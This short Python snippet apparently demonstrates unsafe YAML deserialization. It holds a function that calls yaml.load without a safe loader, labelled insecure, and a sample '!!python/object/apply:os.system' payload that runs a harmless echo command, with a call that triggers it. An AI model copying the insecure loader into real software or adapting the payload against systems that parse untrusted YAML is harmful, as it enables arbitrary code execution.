import yaml

# Vulnerable function that loads YAML input
def load_yaml(yaml_input):
    # Using the default loader (yaml.Loader)
    data = yaml.load(yaml_input)  # This is insecure
    return data

# Example of malicious YAML input
malicious_yaml = """
!!python/object/apply:os.system ['echo Vulnerable!']
"""

# Calling the vulnerable function
load_yaml(malicious_yaml)  # This could execute `echo Vulnerable!`